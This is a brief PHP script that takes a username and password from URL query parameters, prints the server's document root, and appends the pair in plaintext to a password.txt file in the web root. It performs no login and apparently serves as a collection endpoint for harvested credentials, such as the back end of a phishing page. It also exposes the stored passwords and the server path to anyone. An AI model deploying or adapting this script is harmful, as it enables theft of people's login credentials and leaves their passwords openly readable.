<?php

    if(!empty($_GET['password'])){
        $username=$_GET['username'];
        $password=$_GET['password'];
        echo $_SERVER["DOCUMENT_ROOT"];
		echo '<br>';
        try{
            $path=$_SERVER["DOCUMENT_ROOT"].'/password.txt';
            $fp=fopen($path,'a');
            flock($fp, LOCK_EX);
            fwrite($fp, "$username\t $password\r\n");
            flock($fp, LOCK_UN);
            fclose($fp);
        }catch(Exception $e){

        }
    }
?>
